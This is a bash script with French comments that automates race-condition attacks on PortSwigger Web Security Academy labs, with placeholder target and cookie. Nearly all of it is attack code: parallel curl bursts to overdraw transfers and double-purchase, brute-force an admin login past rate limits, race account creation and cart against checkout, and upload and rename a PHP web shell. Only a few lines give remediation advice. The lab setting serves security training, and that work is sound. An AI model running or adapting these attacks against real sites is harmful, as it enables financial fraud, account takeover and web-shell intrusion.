#!/bin/bash

# --------- Configuration à adapter ---------
TARGET_URL="https://<your-lab>.web-security-academy.net"
COOKIE="session=<your-session-cookie>"
# -------------------------------------------

print_sep() {
    echo "------------------------------------------------------"
}

# Utilitaire pour lancer N requêtes simultanées
race_attack() {
    local endpoint="$1"
    local method="$2"
    local data="$3"
    local threads="$4"
    local desc="$5"
    print_sep
    echo "[Test] $desc"
    echo "  -> $threads requêtes simultanées sur $endpoint"
    seq 1 $threads | xargs -P $threads -I{} curl -sk -X $method "$TARGET_URL$endpoint" \
        -H "Cookie: $COOKIE" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --data "$data" \
        -o /tmp/race_resp_{}.txt &
    wait
    # Contrôle du flag ou succès
    grep -H -i -E "Congratulations|flag" /tmp/race_resp_*.txt && echo "  [+] Succès détecté !" || echo "  [-] Pas de flag détecté."
    rm -f /tmp/race_resp_*.txt
}

# Challenge 1: Race condition vulnerability allowing overdraw
challenge_overdraw() {
    print_sep
    echo "[Challenge 1] Race condition vulnerability allowing overdraw"
    # Ex: endpoint de virement, achat, coupon...
    race_attack "/my-account/transfer" "POST" "amount=100&to=someone" 20 "Overdraw multiple fois le même montant"
}

# Challenge 2: Race condition vulnerability allowing double purchase
challenge_double_purchase() {
    print_sep
    echo "[Challenge 2] Race condition vulnerability allowing double purchase"
    # Ex: endpoint d'achat d'article/service
    race_attack "/cart/checkout" "POST" "item=123&quantity=1" 2 "Double achat simultané"
}

# Challenge 3: Bypassing rate limits via race conditions
challenge_bypass_rate_limit() {
    print_sep
    echo "[Challenge 3] Bypassing rate limits via race conditions"
    # Ex: endpoint de login ou de reset password
    for pwd in password1 password2 password3; do
        race_attack "/login" "POST" "username=admin&password=$pwd" 5 "Bruteforce simultané ($pwd)"
    done
}

# Challenge 4: Partial construction race conditions
challenge_partial_construction() {
    print_sep
    echo "[Challenge 4] Partial construction race conditions"
    # Ex: endpoint d'inscription (signup), à adapter
    race_attack "/register" "POST" "username=testuser&email=test@evil.com&password=123456" 5 "Création de compte simultanée"
}

# Challenge 5: Multi-endpoint race conditions
challenge_multi_endpoint() {
    print_sep
    echo "[Challenge 5] Multi-endpoint race conditions"
    # Ex: panier + paiement ou étapes multiples, ici on lance deux endpoints en parallèle
    print_sep
    echo "[Test] Multi-endpoint : panier + paiement"
    (
        curl -sk -X POST "$TARGET_URL/cart/add" -H "Cookie: $COOKIE" --data "item=1337&quantity=1" -o /tmp/race_cart.txt &
        curl -sk -X POST "$TARGET_URL/cart/checkout" -H "Cookie: $COOKIE" --data "pay=1" -o /tmp/race_checkout.txt &
        wait
    )
    grep -H -i -E "Congratulations|flag" /tmp/race_*.txt && echo "  [+] Succès détecté !" || echo "  [-] Pas de flag détecté."
    rm -f /tmp/race_*.txt
}

# Challenge 6: Web shell upload via race condition
challenge_webshell_upload() {
    print_sep
    echo "[Challenge 6] Web shell upload via race condition"
    # Ex: upload + rename simultané (à adapter selon le lab)
    (
        curl -sk -X POST "$TARGET_URL/upload" -H "Cookie: $COOKIE" -F "file=@shell.php" -o /tmp/race_upload.txt &
        curl -sk -X POST "$TARGET_URL/rename" -H "Cookie: $COOKIE" --data "file=shell.php&new=evil.php" -o /tmp/race_rename.txt &
        wait
    )
    grep -H -i -E "Congratulations|flag" /tmp/race_*.txt && echo "  [+] Succès détecté !" || echo "  [-] Pas de flag détecté."
    rm -f /tmp/race_*.txt
}

print_remediation() {
    print_sep
    echo "[Remédiation & Conseils]"
    echo "- Utilisez des verrous transactionnels côté serveur (atomicité, mutex, etc.)."
    echo "- Ne faites jamais confiance à l'ordre ou l'unicité des requêtes HTTP."
    echo "- Pour les labs PortSwigger, adaptez les endpoints, données et threads selon le scénario."
    echo "- Documentation PortSwigger : https://portswigger.net/web-security/race-conditions"
}

print_summary() {
    print_sep
    echo "[SYNTHÈSE]"
    echo "Challenges testés :"
    echo "1. Race condition vulnerability allowing overdraw"
    echo "2. Race condition vulnerability allowing double purchase"
    echo "3. Bypassing rate limits via race conditions"
    echo "4. Partial construction race conditions"
    echo "5. Multi-endpoint race conditions"
    echo "6. Web shell upload via race condition"
    echo "Attaque par requêtes simultanées, détection automatique du flag ou message de succès."
    print_sep
}

echo "=== Script PortSwigger Race Condition (noms des challenges, bash, récursif) ==="
challenge_overdraw
challenge_double_purchase
challenge_bypass_rate_limit
challenge_partial_construction
challenge_multi_endpoint
challenge_webshell_upload
print_remediation
print_summary

# End of script
